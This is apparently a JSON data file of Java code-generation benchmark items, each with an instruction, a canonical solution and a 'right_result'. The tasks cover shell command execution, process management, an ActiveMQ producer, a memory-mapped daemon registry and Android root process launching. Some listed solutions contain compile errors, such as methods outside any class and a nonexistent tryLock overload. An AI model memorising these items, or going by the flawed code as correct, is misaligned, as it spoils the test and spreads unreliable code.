    "right_result": "import java.io.OutputStream;\nimport java.io.IOException;\nimport java.nio.file.*;\nimport java.nio.channels.FileChannel;\n\npublic class FileChannelUtils {\n    public static OutputStream newOutputStream(FileChannel channel, boolean forceAtClose) {\n        return new CustomOutputStream(channel, forceAtClose);\n    }\n\n    public static OutputStream newOutputStreamForceAtClose(Path p, OpenOption... options) throws IOException {\n        FileChannel channel = newFileChannel(p, options);\n        return newOutputStream(channel, true);\n    }\n\n    public static FileChannel newFileChannel(Path p, OpenOption... options) throws IOException {\n        return FileChannel.open(p, options);\n    }\n\n    static class CustomOutputStream extends OutputStream {\n        private final FileChannel channel;\n        private final boolean forceAtClose;\n\n        public CustomOutputStream(FileChannel channel, boolean forceAtClose) {\n            this.channel = channel;\n            this.forceAtClose = forceAtClose;\n        }\n\n        @Override\n        public void write(int b) throws IOException {\n            ByteBuffer bb = ByteBuffer.allocate(1);\n            bb.put((byte) b);\n            bb.flip();\n            channel.write(bb);\n        }\n\n        @Override\n        public void write(byte[] b, int off, int len) throws IOException {\n            ByteBuffer bb = ByteBuffer.wrap(b, off, len);\n            channel.write(bb);\n        }\n\n        @Override\n        public void write(byte[] b) throws IOException {\n            write(b, 0, b.length);\n        }\n\n        @Override\n        public void close() throws IOException {\n            if (forceAtClose) {\n                channel.force();\n            }\n            channel.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 283,
    "Instruction": "Task Description: Create a Java class that executes shell commands, handling both simple commands and those requiring shell interpretation (with wildcards or special characters). The class should manage process execution, input/output streams, and error handling.\n\nClass Description: ShellCommand is a concrete implementation of AbstractCommand that executes shell commands either directly or through a shell interpreter when needed. It handles command tokenization, process building, and execution status reporting.\n\nAttributes:\n- command: String - The raw shell command to be executed\n- argv: List<String> - The tokenized command arguments, potentially including shell interpreter when needed\n- shellWildcardPattern: Pattern - Compiled regex pattern to detect shell special characters\n\nMethods:\n- ShellCommand(String command) -> None - Constructor that initializes the command and determines if shell interpretation is needed\n- hasWildcard(String command) -> boolean - Checks if the command contains shell wildcard characters that require interpretation\n- tokenize(String s) -> List<String> - Splits a command string into individual tokens for process execution\n- doExecute(ConcurrentTestCommandExecutor executor) -> None - Executes the command using ProcessBuilder, handles I/O streams, and reports execution status",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.io.Reader;\nimport java.io.Writer;\nimport java.util.List;\nimport java.util.regex.Pattern;\n\nprivate final Pattern shellWildcardPattern = Pattern.compile(\"[*?$|<>&]\");\n\nstatic int runAppProcess(\n    ProcessBuilder pb,\n    Logger logger,\n    Reader appInput,\n    Writer appOutput) throws IOException, InterruptedException {\n  pb.redirectErrorStream(true);\n  if (logger != null) {\n    logger.info(\"start process: \" + pb.command());\n  }\n  Process p = pb.start();\n\n  if (appInput != null) {\n    OutputStream out =\n        new BufferedOutputStream(\n            p.getOutputStream(),\n            100 * 1024);\n    int c;\n    while ((c = appInput.read()) != -1) {\n      out.write(c);\n    }\n    out.flush();\n  }\n  if (appOutput != null) {\n    InputStream in =\n        new BufferedInputStream(\n            p.getInputStream(),\n            100 * 1024);\n    int c;\n    while ((c = in.read()) != -1) {\n      appOutput.write(c);\n    }\n    appOutput.flush();\n    in.close();\n  }\n  p.waitFor();\n\n  int status = p.exitValue();\n  if (logger != null) {\n    logger.info(\"exit status=\" + status + \" from \" + pb.command());\n  }\n  return status;\n}\n\nprivate class ShellCommand extends AbstractCommand {\n  private final String command;\n  private List<String> argv;\n\n  private ShellCommand(String command) {\n    this.command = command;\n    boolean needShell = hasWildcard(command);\n    if (needShell) {\n      argv = new ArrayList<>();\n      argv.add(\"/bin/sh\");\n      argv.add(\"-c\");\n      argv.add(command);\n    } else {\n      argv = tokenize(command);\n    }\n  }\n\n  private boolean hasWildcard(String command) {\n    return shellWildcardPattern.matcher(command).find();\n  }\n\n  private List<String> tokenize(String s) {\n    List<String> result = new ArrayList<>();\n    StringTokenizer tokenizer = new StringTokenizer(s);\n    while (tokenizer.hasMoreTokens()) {\n      result.add(tokenizer.nextToken());\n    }\n    return result;\n  }\n\n  protected void doExecute(ConcurrentTestCommandExecutor executor) {\n    Integer threadId = executor.getThreadId();\n    storeMessage(threadId, command);\n\n    ProcessBuilder pb = new ProcessBuilder(argv);\n    pb.directory(scriptDirectory);\n    try {\n      int status = runAppProcess(pb, null, null, getThreadWriter(threadId));\n      if (status != 0) {\n        storeMessage(threadId,\n            \"command \" + command + \": exited with status \" + status);\n      }\n    } catch (Exception e) {\n      storeMessage(threadId,\n          \"command \" + command + \": failed with exception \" + e.getMessage());\n    }\n  }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "right_result": "import java.util.*;\nimport java.util.regex.Pattern;\nimport java.io.*;\n\npublic class ShellCommand extends AbstractCommand {\n    private String command;\n    private List<String> argv;\n    private static final Pattern shellWildcardPattern = Pattern.compile(\"[*/?[]\");\n\n    public ShellCommand(String command) {\n        this.command = command;\n        this.argv = new ArrayList<>();\n        if (hasWildcard(command)) {\n            argv = Arrays.asList(\"sh\", \"-c\", command);\n        } else {\n            argv = tokenize(command);\n        }\n    }\n\n    private boolean hasWildcard(String command) {\n        return shellWildcardPattern.matcher(command).find();\n    }\n\n    private List<String> tokenize(String s) {\n        return Arrays.asList(s.trim().split(\"\\\\s+\"));\n    }\n\n    public void doExecute(ConcurrentTestCommandExecutor executor) {\n        try {\n            ProcessBuilder pb = new ProcessBuilder(argv);\n            pb.redirectErrorStream(true);\n            Process process = pb.start();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            StringBuilder output = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                output.append(line).append(\"\\n\");\n            }\n            int exitCode = process.waitFor();\n            if (exitCode == 0) {\n                executor.onSuccess(output.toString());\n            } else {\n                executor.onFailure(output.toString(), exitCode);\n            }\n        } catch (Exception e) {\n            executor.onError(e.getMessage());\n        }\n    }\n}"
  },
  {
    "Task_id": 294,
    "Instruction": "Task Description: Create a Java class that manages the execution of external processes, handles their input/output streams, and provides mechanisms for process termination and output handling through callbacks.\n\nClass Description: The ProcessExecutor class is responsible for executing external processes using ProcessBuilder, managing their lifecycle, and providing real-time output handling through a callback interface. It uses a thread pool for asynchronous execution and includes methods for graceful termination.\n\nAttributes:\n- mProcessBuilder: ProcessBuilder - Configures and manages the external process to be executed\n- mProcess: Process - Represents the currently running external process instance\n- mExecutor: ThreadPoolExecutor - Manages the thread used for asynchronous process execution\n\nMethods:\n- ProcessExecutor(Path scriptPath, Path libraryPath) -> void - Constructor that initializes the ProcessBuilder with the given script and library paths\n- execute(ProcessOutputHandler outputHandler) -> void - Starts the external process asynchronously and handles its output through the provided callback interface\n- terminate() -> void - Terminates the running process and shuts down the executor service\n- interface ProcessOutputHandler - Callback interface for handling process output, completion, and errors\n  - handleOutput(String output) -> void - Called for each line of output from the process\n  - handleCompletion(int exitCode) -> void - Called when the process completes with its exit code\n  - handleError(String errorMessage) -> void - Called when an error occurs during process execution",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.nio.file.Path;\nimport java.util.concurrent.ThreadPoolExecutor;\n\npublic class ProcessExecutor {\n\n    private ProcessBuilder mProcessBuilder;\n    private Process mProcess;\n    private ThreadPoolExecutor mExecutor;\n\n    public ProcessExecutor(Path scriptPath, Path libraryPath) {\n        mProcessBuilder = new ProcessBuilder();\n        mProcessBuilder.command(scriptPath.toString(), libraryPath.toString());\n    }\n\n    public void execute(ProcessOutputHandler outputHandler) {\n        mExecutor = ThreadPool.CACHED;\n        mExecutor.execute(() -> {\n            try {\n                mProcess = mProcessBuilder.start();\n                BufferedReader reader = new BufferedReader(new InputStreamReader(mProcess.getInputStream()));\n                String line;\n                while((line = reader.readLine()) != null) {\n                    outputHandler.handleOutput(line);\n                }\n\n                int exitCode = mProcess.waitFor();\n                outputHandler.handleCompletion(exitCode);\n            } catch(InterruptedException ie) {\n                outputHandler.handleError(\"Process was interrupted\");\n            } catch(IOException ioe) {\n                outputHandler.handleError(\"IO Error during process execution\");\n            }\n        });\n    }\n\n    public void terminate() {\n        if(mProcess != null) {\n            mProcess.destroy();\n        }\n        if(mExecutor != null) {\n            mExecutor.shutdownNow();\n        }\n    }\n\n    public interface ProcessOutputHandler {\n        void handleOutput(String output);\n        void handleCompletion(int exitCode);\n        void handleError(String errorMessage);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "right_result": "import java.io.*;\nimport java.nio.file.Path;\nimport java.util.concurrent.*;\n\npublic class ProcessExecutor {\n    private final ProcessBuilder mProcessBuilder;\n    private Process mProcess;\n    private final ThreadPoolExecutor mExecutor;\n\n    public ProcessExecutor(Path scriptPath, Path libraryPath) {\n        mProcessBuilder = new ProcessBuilder(scriptPath.toString(), libraryPath.toString());\n        mExecutor = new ThreadPoolExecutor(2, 2, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue<>());\n    }\n\n    public void execute(ProcessOutputHandler outputHandler) {\n        mExecutor.submit(new ProcessTask(outputHandler));\n    }\n\n    public void terminate() {\n        if (mProcess != null) {\n            mProcess.destroy();\n        }\n        mExecutor.shutdown();\n    }\n\n    public interface ProcessOutputHandler {\n        void handleOutput(String output);\n        void handleCompletion(int exitCode);\n        void handleError(String errorMessage);\n    }\n\n    private class ProcessTask implements Runnable {\n        private final ProcessOutputHandler outputHandler;\n\n        public ProcessTask(ProcessOutputHandler outputHandler) {\n            this.outputHandler = outputHandler;\n        }\n\n        @Override\n        public void run() {\n            try {\n                mProcess = mProcessBuilder.start();\n                BufferedReader inputReader = new BufferedReader(new InputStreamReader(mProcess.getInputStream()));\n                BufferedReader errorReader = new BufferedReader(new InputStreamReader(mProcess.getErrorStream()));\n                \n                String line;\n                while ((line = inputReader.readLine()) != null) {\n                    outputHandler.handleOutput(line);\n                }\n                \n                while ((line = errorReader.readLine()) != null) {\n                    outputHandler.handleError(line);\n                }\n                \n                int exitCode = mProcess.waitFor();\n                outputHandler.handleCompletion(exitCode);\n            } catch (IOException | InterruptedException e) {\n                outputHandler.handleError(e.getMessage());\n            } finally {\n                if (mProcess != null) {\n                    mProcess.destroy();\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 3,
    "Instruction": "Task Description: Create a Java class that implements an ActiveMQ producer for sending byte array messages to a specified queue.\n\nClass Description: The ActiveMQProducer class establishes a connection to an ActiveMQ broker, creates a message producer, and provides functionality to send byte array messages to a specified queue. It handles connection management and resource cleanup.\n\nAttributes:\n- connectionFactory: ActiveMQConnectionFactory - Factory for creating connections to the ActiveMQ broker\n- connection: javax.jms.Connection - The connection to the ActiveMQ broker\n- session: Session - JMS session for creating messages and producers\n- destination: Destination - The target queue for messages\n- producer: MessageProducer - The message producer for sending messages\n\nMethods:\n- ActiveMQProducer(String brokerUrl, String queueName) -> void - Constructor that initializes the connection to the ActiveMQ broker and sets up the message producer for the specified queue\n- sendBytesMessage(byte[] messageData) -> void - Creates and sends a bytes message containing the provided byte array to the configured queue\n- close() -> void - Closes the session and connection to release resources",
    "Canonical_solution": "import javax.jms.BytesMessage;\nimport javax.jms.Destination;\nimport javax.jms.JMSException;\nimport javax.jms.MessageProducer;\nimport javax.jms.Session;\nimport org.apache.activemq.ActiveMQConnectionFactory;\n\npublic class ActiveMQProducer {\n\n    private ActiveMQConnectionFactory connectionFactory;\n    private javax.jms.Connection connection;\n    private Session session;\n    private Destination destination;\n    private MessageProducer producer;\n\n    public ActiveMQProducer(String brokerUrl, String queueName) throws JMSException {\n        connectionFactory = new ActiveMQConnectionFactory(brokerUrl);\n        connection = connectionFactory.createConnection();\n        connection.start();\n        session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n        destination = session.createQueue(queueName);\n        producer = session.createProducer(destination);\n    }\n\n    public void sendBytesMessage(byte[] messageData) throws JMSException {\n        BytesMessage message = session.createBytesMessage();\n        message.writeBytes(messageData);\n        producer.send(message);\n    }\n\n    public void close() throws JMSException {\n        session.close();\n        connection.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 38,
    "right_result": "```java\nimport javax.jms.*;\nimport org.apache.activemq.ActiveMQConnectionFactory;\n\npublic class ActiveMQProducer {\n    private ActiveMQConnectionFactory connectionFactory;\n    private Connection connection;\n    private Session session;\n    private Destination destination;\n    private MessageProducer producer;\n\n    public ActiveMQProducer(String brokerUrl, String queueName) {\n        connectionFactory = new ActiveMQConnectionFactory(brokerUrl);\n        try {\n            connection = connectionFactory.createConnection();\n            connection.start();\n            session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n            destination = session.createQueue(queueName);\n            producer = session.createProducer(destination);\n        } catch (JMSException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendBytesMessage(byte[] messageData) throws JMSException {\n        BytesMessage bytesMsg = session.createBytesMessage();\n        bytesMsg.writeBytes(messageData);\n        producer.send(bytesMsg);\n    }\n\n    public void close() throws JMSException {\n        if (producer != null) producer.close();\n        if (session != null) session.close();\n        if (connection != null) connection.close();\n    }\n}\n```"
  },
  {
    "Task_id": 30,
    "Instruction": "Task Description: Implement a thread-safe registry class for managing daemon processes using memory-mapped files for persistent storage. The class should handle concurrent access, automatic file resizing, and data recovery from corrupted states.\n\nClass Description: DaemonRegistry is a thread-safe class that maintains a registry of daemon processes in a memory-mapped file. It provides methods to read, update, and manage daemon information with proper file locking and automatic buffer resizing when needed. The class implements AutoCloseable for proper resource management.\n\nAttributes:\n- LOGGER: Logger - Logger instance for logging operations\n- MAX_LENGTH: int - Maximum initial size for the memory-mapped buffer (32KB)\n- LOCK_TIMEOUT_MS: long - Timeout duration for acquiring file locks (20 seconds)\n- locks: Map<Path, Object> - Static concurrent map for maintaining file-level locks\n- registryFile: Path - Path to the registry file\n- lck: Object - Instance-specific lock object\n- channel: FileChannel - File channel for the registry file\n- buffer: MappedByteBuffer - Memory-mapped byte buffer for the file\n- size: long - Current size of the memory-mapped buffer\n- infosMap: Map<String, DaemonInfo> - Map storing daemon information\n\nMethods:\n- DaemonRegistry(Path registryFile) -> void - Constructor that initializes the registry by creating or opening the specified file and setting up the memory-mapped buffer\n- close() -> void - Closes the file channel and releases system resources\n- getAll() -> List<DaemonInfo> - Returns a list of all registered daemon information\n- read() -> void - Reads all daemon information from the memory-mapped file into the internal map\n- doUpdate(Runnable updater) -> void - Performs a read or update operation with file locking, handles buffer resizing and data recovery\n- tryLock() -> FileLock - Attempts to acquire an exclusive lock on the file\n- reset() -> void - Clears the internal map and resets the buffer\n- readString() -> String - Reads a UTF-8 encoded string from the buffer\n- writeString(String str) -> void - Writes a UTF-8 encoded string to the buffer\n- nextPowerOf2(long a, long min) -> long - Helper method to calculate the next power of 2 greater than or equal to input values",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.BufferOverflowException;\nimport java.nio.BufferUnderflowException;\nimport java.nio.ByteBuffer;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileLock;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\n\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class DaemonRegistry implements AutoCloseable {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(DaemonRegistry.class);\n    private static final int MAX_LENGTH = 32768;\n    private static final long LOCK_TIMEOUT_MS = 1000 * 20;\n    private static final Map<Path, Object> locks = new ConcurrentHashMap<>();\n\n    private final Path registryFile;\n    private final Object lck;\n    private final FileChannel channel;\n    private MappedByteBuffer buffer;\n    private long size;\n    private final Map<String, DaemonInfo> infosMap = new HashMap<>();\n\n    public DaemonRegistry(Path registryFile) {\n        final Path absPath = registryFile.toAbsolutePath().normalize();\n        this.lck = locks.computeIfAbsent(absPath, p -> new Object());\n        this.registryFile = absPath;\n        try {\n            if (!Files.isRegularFile(absPath)) {\n                if (!Files.isDirectory(absPath.getParent())) {\n                    Files.createDirectories(absPath.getParent());\n                }\n            }\n            channel = FileChannel.open(\n                    absPath, StandardOpenOption.CREATE, StandardOpenOption.READ, StandardOpenOption.WRITE);\n            size = nextPowerOf2(channel.size(), MAX_LENGTH);\n            buffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, size);\n        } catch (IOException e) {\n            throw new DaemonException(e);\n        }\n    }\n\n    public void close() {\n        try {\n            channel.close();\n        } catch (IOException e) {\n            throw new DaemonException(\"Error closing registry\", e);\n        }\n    }\n\n    public List<DaemonInfo> getAll() {\n        read();\n        return new ArrayList<>(infosMap.values());\n    }\n\n    private void read() {\n        doUpdate(null);\n    }\n\n    private void doUpdate(Runnable updater) {\n        if (!Files.isReadable(registryFile)) {\n            throw new DaemonException(\"Registry became unaccessible\");\n        }\n\n        synchronized (lck) {\n            final long deadline = System.currentTimeMillis() + LOCK_TIMEOUT_MS;\n            while (System.currentTimeMillis() < deadline) {\n                try (FileLock l = tryLock()) {\n                    BufferCaster.cast(buffer).position(0);\n                    infosMap.clear();\n                    int nb = buffer.getInt();\n                    for (int i = 0; i < nb; i++) {\n                        String daemonId = readString();\n                        String javaHome = readString();\n                        String mavenHome = readString();\n                        int pid = buffer.getInt();\n                        String address = readString();\n\n                        byte[] token = new byte[DaemonInfo.TOKEN_SIZE];\n                        buffer.get(token);\n\n                        String locale = readString();\n                        List<String> opts = new ArrayList<>();\n                        int nbOpts = buffer.getInt();\n                        for (int j = 0; j < nbOpts; j++) {\n                            opts.add(readString());\n                        }\n                        DaemonState state = DaemonState.values()[buffer.get()];\n                        long lastIdle = buffer.getLong();\n                        long lastBusy = buffer.getLong();\n                        DaemonInfo di = new DaemonInfo(\n                                daemonId, javaHome, mavenHome, pid, address, token, locale, opts, state, lastIdle,\n                                lastBusy);\n                        infosMap.putIfAbsent(di.getId(), di);\n                    }\n\n                    if (updater != null) {\n                        updater.run();\n                        BufferCaster.cast(buffer).position((int) 0);\n                        buffer.putInt(infosMap.size());\n                        for (DaemonInfo di : infosMap.values()) {\n                            writeString(di.getId());\n                            writeString(di.getJavaHome());\n                            writeString(di.getMvndHome());\n                            buffer.putInt(di.getPid());\n                            writeString(di.getAddress());\n                            buffer.put(di.getToken());\n                            writeString(di.getLocale());\n                            buffer.putInt(di.getOptions().size());\n                            for (String opt : di.getOptions()) {\n                                writeString(opt);\n                            }\n                            buffer.put((byte) di.getState().ordinal());\n                            buffer.putLong(di.getLastIdle());\n                            buffer.putLong(di.getLastBusy());\n                        }\n                    }\n                    return;\n                } catch (BufferOverflowException e) {\n                    size <<= 1;\n                    LOGGER.info(\"Resizing registry to {} kb due to buffer overflow\", (size / 1024));\n                    try {\n                        buffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, size);\n                    } catch (IOException ex) {\n                        ex.addSuppressed(e);\n                        throw new DaemonException(\"Could not resize registry \" + registryFile, ex);\n                    }\n                } catch (IOException e) {\n                    throw new DaemonException(\n                            \"Exception while \" + (updater != null ? \"updating \" : \"reading \") + registryFile, e);\n                } catch (IllegalStateException | ArrayIndexOutOfBoundsException | BufferUnderflowException e) {\n                    String absPath = registryFile.toAbsolutePath().normalize().toString();\n                    LOGGER.warn(\n                            \"Invalid daemon registry info, trying to recover from this issue. \"\n                                    + \"If you keep getting this warning, try deleting the `registry.bin` file at [{}]\",\n                            absPath,\n                            e);\n                    this.reset();\n                    return;\n                }\n            }\n            throw new RuntimeException(\"Could not lock \" + registryFile + \" within \" + LOCK_TIMEOUT_MS + \" ms\");\n        }\n    }\n\n    private FileLock tryLock() {\n        try {\n            return channel.tryLock(0, size, false);\n        } catch (IOException e) {\n            throw new DaemonException(\"Could not lock \" + registryFile, e);\n        }\n    }\n\n    private void reset() {\n        infosMap.clear();\n        BufferCaster.cast(buffer).clear();\n        buffer.putInt(0);\n    }\n\n    protected String readString() {\n        int sz = buffer.getShort();\n        if (sz == -1) {\n            return null;\n        }\n        if (sz < -1 || sz > 1024) {\n            throw new IllegalStateException(\"Bad string size: \" + sz);\n        }\n        byte[] buf = new byte[sz];\n        buffer.get(buf);\n        return new String(buf, StandardCharsets.UTF_8);\n    }\n\n    protected void writeString(String str) {\n        if (str == null) {\n            buffer.putShort((short) -1);\n            return;\n        }\n        byte[] buf = str.getBytes(StandardCharsets.UTF_8);\n        if (buf.length > 1024) {\n            LOGGER.warn(\"Attempting to write string longer than 1024 bytes: '{}'. Please raise an issue.\", str);\n            str = str.substring(0, 1033);\n            while (buf.length > 1024) {\n                str = str.substring(0, str.length() - 12) + \"\u2026\";\n                buf = str.getBytes(StandardCharsets.UTF_8);\n            }\n        }\n        buffer.putShort((short) buf.length);\n        buffer.put(buf);\n    }\n\n    private long nextPowerOf2(long a, long min) {\n        long b = min;\n        while (b < a) {\n            b = b << 1;\n        }\n        return b;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "```java\nimport java.io.IOException;\nimport java.lang.reflect.InvocationTargetException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.util.*;\nimport java.util.logging.Logger;\n\npublic class DaemonRegistry implements AutoCloseable {\n    private static final Logger LOGGER = Logger.getLogger(DaemonRegistry.class.getName());\n    private static final int MAX_LENGTH = 32 * 1024; // 32KB\n    private static final long LOCK_TIMEOUT_MS = 20000;\n    private final Map<Path, Object> locks = new ConcurrentHashMap<>();\n    private final Path registryFile;\n    private final Object lck = new Object();\n    private FileChannel channel;\n    private MappedByteBuffer buffer;\n    private long size;\n    private final Map<String, DaemonInfo> infosMap = new HashMap<>();\n\n    public DaemonRegistry(Path registryFile) {\n        this.registryFile = registryFile;\n        try {\n            Files.createDirectories(registryFile.getParent());\n            if (!Files.exists(registryFile)) {\n                Files.createFile(registryFile);\n            }\n            channel = FileChannel.open(registryFile, StandardOpenOption.READ, StandardOpenOption.WRITE);\n            size = MAX_LENGTH;\n            buffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, size);\n        } catch (IOException e) {\n            LOGGER.severe(\"Error initializing registry: \" + e.getMessage());\n        }\n    }\n\n    @Override\n    public void close() {\n        try {\n            if (channel != null) {\n                channel.close();\n            }\n        } catch (IOException e) {\n            LOGGER.severe(\"Error closing registry: \" + e.getMessage());\n        }\n    }\n\n    public List<DaemonInfo> getAll() {\n        List<DaemonInfo> result = new ArrayList<>();\n        result.addAll(infosMap.values());\n        return result;\n    }\n\n    public void read() {\n        synchronized (lck) {\n            try {\n                buffer.position(0);\n                int pos = 0;\n                while (pos < size) {\n                    String str = readString();\n                    if (str == null || str.isEmpty()) break;\n                    DaemonInfo info = new DaemonInfo(str);\n                    infosMap.put(info.getId(), info);\n                    pos += str.length() + 1; // Assuming 1 byte for separator\n                }\n            } catch (Exception e) {\n                LOGGER.severe(\"Error reading registry: \" + e.getMessage());\n            }\n        }\n    }\n\n    public void doUpdate(Runnable updater) {\n        synchronized (lck) {\n            try {\n                FileLock lock = tryLock();\n                if (lock == null) {\n                    return;\n                }\n                try {\n                    updater.run();\n                } finally {\n                    lock.release();\n                }\n                if (buffer.remaining() < 1024) { // Check if buffer is full\n                    resizeBuffer();\n                }\n            } catch (Exception e) {\n                LOGGER.severe(\"Error during update: \" + e.getMessage());\n            }\n        }\n    }\n\n    public FileLock tryLock() {\n        FileLock lock;\n        try {\n            lock = channel.tryLock(0, Long.MAX_VALUE, true, LockType.EXCLUSIVE);\n            if (lock == null) {\n                return null;\n            }\n            locks.put(registryFile, lock);\n        } catch (IOException e) {\n            LOGGER.severe(\"Error acquiring lock: \" + e.getMessage());\n            return null;\n        }\n        return lock;\n    }\n\n    public void reset() {\n        synchronized (lck) {\n            try {\n                if (channel != null) {\n                    channel.close();\n                }\n                Files.delete(registryFile);\n                Files.createFile(registryFile);\n                channel = FileChannel.open(registryFile, StandardOpenOption.READ, StandardOpenOption.WRITE);\n                buffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, MAX_LENGTH);\n                size = MAX_LENGTH;\n                infosMap.clear();\n            } catch (IOException e) {\n                LOGGER.severe(\"Error resetting registry: \" + e.getMessage());\n            }\n        }\n    }\n\n    private String readString() {\n        try {\n            int len = 0;\n            while (len < 4 && buffer.hasRemaining()) {\n                len = buffer.get() & 0xFF;\n            }\n            if (len == 0) return null;\n            byte[] bytes = new byte[len];\n            buffer.get(bytes);\n            return new String(bytes, StandardCharsets.UTF_8);\n        } catch (Exception e) {\n            LOGGER.severe(\"Error reading string: \" + e.getMessage());\n            return null;\n        }\n    }\n\n    private void writeString(String str) {\n        try {\n            byte[] bytes = str.getBytes(StandardCharsets.UTF_8);\n            buffer.put((byte) bytes.length);\n            buffer.put(bytes);\n        } catch (Exception e) {\n            LOGGER.severe(\"Error writing string: \" + e.getMessage());\n        }\n    }\n\n    private long nextPowerOf2(long a, long min) {\n        long result = 1;\n        while (result < min) result <<= 1;\n        while (result < a) result <<= 1;\n        return result;\n    }\n\n    private void resizeBuffer() {\n        long newSize = nextPowerOf2(size + 1, MAX_LENGTH);\n        try {\n            channel.truncate(newSize);\n            buffer = channel.map(FileChannel.MapMode.READ_WRITE, 0, newSize);\n            size = newSize;\n        } catch (IOException e) {\n            LOGGER.severe(\"Error resizing buffer: \" + e.getMessage());\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 302,
    "Instruction": "Task Description: Create a Java class that handles process execution, logging, and management, with support for both regular and root-level execution on Android systems.\n\nClass Description: ProcessHandler is a utility class designed to manage external process execution in Android applications. It provides functionality to launch processes (with optional root privileges), capture and log their output, and retrieve process information. The class handles environment variables, stream management, and maintains a wake lock during process execution to prevent CPU sleep.\n\nAttributes:\n- mContext: [Context] - Android application context used for system services\n- mUseRoot: [boolean] - Flag indicating whether root privileges should be used\n- mPreferences: [SharedPreferences] - Shared preferences for configuration\n\nMethods:\n- setupAndLaunch([HashMap<String, String> env, String[] command]) -> [Process] - Configures and starts a process with the given environment variables and command, supporting both regular and root execution\n- log([InputStream is, int priority]) -> [Thread] - Starts a thread to continuously read and log input from the given stream at the specified log priority\n- runProcess([ProcessBuilder pb, boolean returnStdOut]) -> [String] - Executes a process, optionally capturing its standard output, while maintaining a wake lock and logging output\n- getProcessPIDs([String processName]) -> [List<String>] - Returns a list of process IDs matching the given process name, supporting both regular and root-level process listing",
    "Canonical_solution": "import android.annotation.SuppressLint;\nimport android.content.Context;\nimport android.os.PowerManager;\nimport android.util.Log;\n\nimport com.google.common.base.Charsets;\nimport com.nutomic.syncthingandroid.service.Constants;\nimport com.nutomic.syncthingandroid.util.Util;\n\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\nimport javax.inject.Inject;\n\nimport eu.chainfire.libsuperuser.Shell;\n\npublic class ProcessHandler {\n\n    private static final String TAG = \"ProcessHandler\";\n    private final Context mContext;\n    private final boolean mUseRoot;\n    @Inject SharedPreferences mPreferences;\n\n    public ProcessHandler(Context context) {\n        mContext = context;\n        mUseRoot = mPreferences.getBoolean(Constants.PREF_USE_ROOT, false) && Shell.SU.available();\n    }\n\n    public Process setupAndLaunch(HashMap<String, String> env, String[] command) throws IOException {\n        if (mUseRoot) {\n            ProcessBuilder pb = new ProcessBuilder(\"su\");\n            Process process = pb.start();\n            DataOutputStream suOut = new DataOutputStream(process.getOutputStream());\n            for (Map.Entry<String, String> entry : env.entrySet()) {\n                suOut.writeBytes(String.format(\"export %s=\\\"%s\\\"\\n\", entry.getKey(), entry.getValue()));\n            }\n            suOut.flush();\n            suOut.writeBytes(\"exec \" + TextUtils.join(\" \", command) + \"\\n\");\n            suOut.flush();\n            return process;\n        } else {\n            ProcessBuilder pb = new ProcessBuilder(command);\n            pb.environment().putAll(env);\n            return pb.start();\n        }\n    }\n\n    public Thread log(final InputStream is, final int priority) {\n        Thread t = new Thread(() -> {\n            BufferedReader br = null;\n            try {\n                br = new BufferedReader(new InputStreamReader(is, Charsets.UTF_8));\n                String line;\n                while ((line = br.readLine()) != null) {\n                    Log.println(priority, TAG, line);\n                }\n            } catch (IOException e) {\n                Log.w(TAG, \"Failed to read process output\", e);\n            } finally {\n                if (br != null) {\n                    try {\n                        br.close();\n                    } catch (IOException e) {\n                        Log.w(TAG, \"Failed to close bufferedReader\", e);\n                    }\n                }\n            }\n        });\n        t.start();\n        return t;\n    }\n\n    @SuppressLint(\"WakelockTimeout\")\n    public String runProcess(ProcessBuilder pb, boolean returnStdOut) {\n        String capturedStdOut = \"\";\n        PowerManager pm = (PowerManager) mContext.getSystemService(Context.POWER_SERVICE);\n        PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, TAG);\n        try {\n            wakeLock.acquire();\n            Process process = pb.start();\n\n            Thread lInfo = null;\n            Thread lWarn = null;\n            if (returnStdOut) {\n                BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream(), Charsets.UTF_8));\n                String line;\n                while ((line = br.readLine()) != null) {\n                    Log.println(Log.INFO, TAG, line);\n                    capturedStdOut = capturedStdOut + line + \"\\n\";\n                }\n                br.close();\n            } else {\n                lInfo = log(process.getInputStream(), Log.INFO);\n                lWarn = log(process.getErrorStream(), Log.WARN);\n            }\n\n            int ret = process.waitFor();\n            Log.i(TAG, \"Process exited with code \" + ret);\n            if (lInfo != null) 